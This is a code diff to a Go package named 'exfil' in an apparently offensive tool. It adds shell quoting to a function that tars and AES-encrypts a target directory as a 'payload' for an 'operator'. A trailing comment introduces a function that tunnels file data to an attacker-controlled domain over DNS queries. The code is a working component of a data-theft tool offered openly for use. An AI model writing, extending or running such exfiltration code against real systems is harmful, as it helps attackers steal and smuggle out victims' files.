@@ -3,19 +3,24 @@ package exfil
 import (
 	"context"
 	"fmt"
+	"strings"
 
 	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
 )
 
+func shellQuote(s string) string {
+	return strings.ReplaceAll(s, "'", "'\\''")
+}
+
 // CompressAndEncrypt compresses a target directory and encrypts it with AES-256-CBC.
 func CompressAndEncrypt(ctx context.Context, sourcePath, destPath, password string, sb *sandbox.Docker) (string, error) {
-	cmd := fmt.Sprintf("tar -czf - %s | openssl enc -aes-256-cbc -salt -pbkdf2 -k '%s' -out %s", sourcePath, password, destPath)
+	cmd := fmt.Sprintf("tar -czf - %s | openssl enc -aes-256-cbc -salt -pbkdf2 -k '%s' -out %s", shellQuote(sourcePath), shellQuote(password), shellQuote(destPath))
 	out, err := sb.Execute(ctx, cmd)
 	if err != nil {
 		return "", fmt.Errorf("encryption failed: %v\nOutput: %s", err, out)
 	}
 
-	return fmt.Sprintf("[+] Payload compressed and AES-256 encrypted at %s\n[!] Decrypt command for operator:\n    openssl enc -d -aes-256-cbc -pbkdf2 -k '%s' -in <file> | tar -xz", destPath, password), nil
+	return fmt.Sprintf("[+] Payload compressed and AES-256 encrypted at %s\n[!] Decrypt command for operator:\n    openssl enc -d -aes-256-cbc -pbkdf2 -k '%s' -in <file> | tar -xz", destPath, shellQuote(password)), nil
 }
 
 // ExfiltrateDNS tunnels file data out via DNS A-record queries to an attacker-controlled domain.
